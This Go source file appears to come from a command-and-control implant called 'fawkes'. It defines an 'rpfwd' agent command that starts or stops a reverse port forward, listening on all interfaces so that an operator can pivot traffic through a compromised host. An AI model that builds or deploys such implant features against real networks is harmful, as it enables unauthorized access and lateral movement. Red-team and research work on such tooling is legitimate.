package commands

import (
	"encoding/json"

	"fawkes/pkg/rpfwd"
	"fawkes/pkg/structs"
)

// rpfwdManagerInstance is set by main.go when the agent initializes.
var rpfwdManagerInstance *rpfwd.Manager

// SetRpfwdManager sets the rpfwd manager instance for the rpfwd command.
func SetRpfwdManager(mgr *rpfwd.Manager) {
	rpfwdManagerInstance = mgr
}

// GetRpfwdManager returns the rpfwd manager instance.
func GetRpfwdManager() *rpfwd.Manager {
	return rpfwdManagerInstance
}

// RpfwdCommand implements the rpfwd command
type RpfwdCommand struct{}

func (c *RpfwdCommand) Name() string {
	return "rpfwd"
}

func (c *RpfwdCommand) Description() string {
	return "Start or stop a reverse port forward through this agent"
}

func (c *RpfwdCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		Action string `json:"action"`
		Port   int    `json:"port"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Failed to parse parameters: %v", err)
	}

	if rpfwdManagerInstance == nil {
		return errorResult("rpfwd manager not initialized")
	}

	port := uint32(params.Port)

	switch params.Action {
	case "start":
		if err := rpfwdManagerInstance.Start(port); err != nil {
			return errorf("Failed to start rpfwd on port %d: %v", port, err)
		}
		return successf("[+] Reverse port forward started — listening on 0.0.0.0:%d", port)

	case "stop":
		if err := rpfwdManagerInstance.Stop(port); err != nil {
			return errorf("Failed to stop rpfwd on port %d: %v", port, err)
		}
		return successf("[+] Reverse port forward on port %d stopped", port)

	default:
		return errorf("Unknown action: %s (use 'start' or 'stop')", params.Action)
	}
}
